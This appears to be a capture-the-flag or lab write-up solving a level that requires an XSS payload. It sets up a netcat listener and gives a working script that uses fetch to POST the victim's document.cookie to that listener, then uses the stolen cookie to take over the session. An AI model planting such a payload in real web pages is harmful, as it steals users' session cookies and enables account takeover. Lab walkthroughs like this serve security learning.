This level requires us to create an XSS payload that would make the user send their cookie to a `netcat` server listening on a certain port.

First, we'll need to setup a `netcat` server that would listen for the cookie.

```bash
nc -lvp 12345
```

Next, we'll need to craft an XSS payload that would send the cookie to our `netcat` server. To do this, we can use the `fetch` API along with the POST request, as the POST request allows us to specify the content, which can contain the cookie.

```html
<script>fetch("http://127.0.0.1:12345", {method:"POST",body:document.cookie})</script>
```

When the victim accesses the website, this script will make a request to the server with the cookie being sent in the content of the request. Once we've received the user's cookie in the `netcat` server, we can replace our cookie with the user's cookie and access the flag.